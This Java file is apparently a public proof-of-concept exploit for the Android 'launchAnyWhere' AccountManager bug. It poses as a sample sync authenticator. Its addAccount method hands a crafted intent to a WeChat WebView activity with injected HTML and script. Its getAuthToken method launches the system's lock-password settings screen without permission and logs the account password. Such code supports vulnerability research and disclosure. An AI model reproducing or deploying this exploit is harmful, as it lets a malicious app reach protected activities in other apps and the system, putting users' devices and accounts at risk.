
package com.example.android.samplesync.authenticator;

import com.example.android.samplesync.Constants;
import com.example.android.samplesync.client.NetworkUtilities;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;

/**
launchAnyWhere(Bug )    poc   by  retme  

weibo: @retme
http://blogs.360.cn
http://retme.net

http://blogs.360.cn/360mobile/2014/08/19/launchanywhere-google-bug-7699048
https://github.com/retme7/launchAnyWhere_poc_by_retme_bug_7699048

 */
class Authenticator extends AbstractAccountAuthenticator {

	
    /** The tag used to log to adb console. **/
    private static final String TAG = "Authenticator";

    // Authentication Service context
    private final Context mContext;

    public Authenticator(Context context) {
        super(context);
        mContext = context;
    }

    
    public final static String HTML = 
    	    "<body>" + 
    	    "<u>Wait a few seconds.</u>" + 
    	    "<script>" + 
    	    "var d = document;" + 
    	    "function doitjs() {" + 
    	    " var xhr = new XMLHttpRequest;" + 
    	    " xhr.onload = function() {" + 
    	    " var txt = xhr.responseText;" + 
    	    " d.body.appendChild(d.createTextNode(txt));" + 
    	    " alert(txt);" + " };" + 
    	    " xhr.open('GET', d.URL);" + 
    	    " xhr.send(null);" + 
    	    "}" + 
    	    "setTimeout(doitjs, 8000);" + 
    	    "</script>" + 
    	    "</body>";
    
    public final static String HTML2 = 
    "<script language=\"javascript\" type=\"text/javascript\">" +
    "window.location.href=\"http://blogs.360.cn\"; " +
"</script>";

    
    
    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
            String authTokenType, String[] requiredFeatures, Bundle options) {
        Log.v(TAG, "addAccount()");
        //final Intent intent = new Intent(mContext, AuthenticatorActivity.class);
        Intent intent = new Intent();
       /* intent.setComponent(new ComponentName(
               "com.eg.android.AlipayGphone",
                  "com.alipay.mobile.browser.HtmlActivity"));*/
        
        intent.setComponent(new ComponentName(
                "com.tencent.mm",
                   "com.tencent.mm.plugin.webview.ui.tools.ContactQZoneWebView"));
        
       
        intent.setAction(Intent.ACTION_RUN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        //intent.putExtra("url", "http://drops.wooyun.org/webview.html");
        intent.putExtra("data", HTML2);
        intent.putExtra("baseurl", "http://www.360.cn");
        intent.putExtra("title", "Account bug");
        final Bundle bundle = new Bundle();
        bundle.putParcelable(AccountManager.KEY_INTENT, intent);
        return bundle;
    }

    @Override
    public Bundle confirmCredentials(
            AccountAuthenticatorResponse response, Account account, Bundle options) {
        Log.v(TAG, "confirmCredentials()");
        return null;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        Log.v(TAG, "editProperties()");
        throw new UnsupportedOperationException();
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account,
            String authTokenType, Bundle loginOptions) throws NetworkErrorException {
        Log.v(TAG, "getAuthToken()");

        // If the caller requested an authToken type we don't support, then
        // return an error
       if (!authTokenType.equals(Constants.AUTHTOKEN_TYPE)) {
            final Bundle result = new Bundle();
            result.putString(AccountManager.KEY_ERROR_MESSAGE, "invalid authTokenType");
            
            Log.v(TAG, "invalid authTokenType" );
            return result;
        }

        // Extract the username and password from the Account Manager, and ask
        // the server for an appropriate AuthToken.
        final AccountManager am = AccountManager.get(mContext);
        final String password = am.getPassword(account);
        
        
        Log.v(TAG, "password()"  + password);
        if (password != null && false ) {
             String authToken ;//= NetworkUtilities.authenticate(account.name, password);
            authToken = "sadklKLOIHogOpokjh8";
            if (!TextUtils.isEmpty(authToken)) {
            	
            	Log.v(TAG, "start intent");
                final Bundle result = new Bundle();
                result.putString(AccountManager.KEY_ACCOUNT_NAME, account.name);
                result.putString(AccountManager.KEY_ACCOUNT_TYPE, Constants.ACCOUNT_TYPE);
                result.putString(AccountManager.KEY_AUTHTOKEN, authToken);
                Intent intent = new Intent();
                intent.setComponent(new ComponentName(
                        "com.android.settings",
                          "com.android.settings.ChooseLockPassword"));
                intent.setAction(Intent.ACTION_RUN);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        		//intent.putExtra(AccountManager.KEY_ACCOUNT_AUTHENTICATOR_RESPONSE, response);
        		result.putParcelable(AccountManager.KEY_INTENT, intent);
        
                return result;
            }
        }

        // If we get here, then we couldn't access the user's password - so we
        // need to re-prompt them for their credentials. We do that by creating
        // an intent to display our AuthenticatorActivity panel.
        /*final Intent intent = new Intent(mContext, AuthenticatorActivity.class);
        intent.putExtra(AuthenticatorActivity.PARAM_USERNAME, account.name);
        intent.putExtra(AuthenticatorActivity.PARAM_AUTHTOKEN_TYPE, authTokenType);
        intent.putExtra(AccountManager.KEY_ACCOUNT_AUTHENTICATOR_RESPONSE, response);*/
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "com.android.settings",
                  "com.android.settings.ChooseLockPassword"));
        intent.setAction(Intent.ACTION_RUN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        final Bundle bundle = new Bundle();

        bundle.putParcelable(AccountManager.KEY_INTENT, intent);
        bundle.putString(AccountManager.KEY_AUTH_FAILED_MESSAGE, "You have  a  missed Call");
        return bundle;
    }

    @Override
    public String getAuthTokenLabel(String authTokenType) {
        // null means we don't support multiple authToken types
        Log.v(TAG, "getAuthTokenLabel()");
        return null;
    }

    @Override
    public Bundle hasFeatures(
            AccountAuthenticatorResponse response, Account account, String[] features) {
        // This call is used to query whether the Authenticator supports
        // specific features. We don't expect to get called, so we always
        // return false (no) for any queries.
        Log.v(TAG, "hasFeatures()");
        final Bundle result = new Bundle();
        result.putBoolean(AccountManager.KEY_BOOLEAN_RESULT, false);
        return result;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account,
            String authTokenType, Bundle loginOptions) {
        Log.v(TAG, "updateCredentials()");
        return null;
    }
}
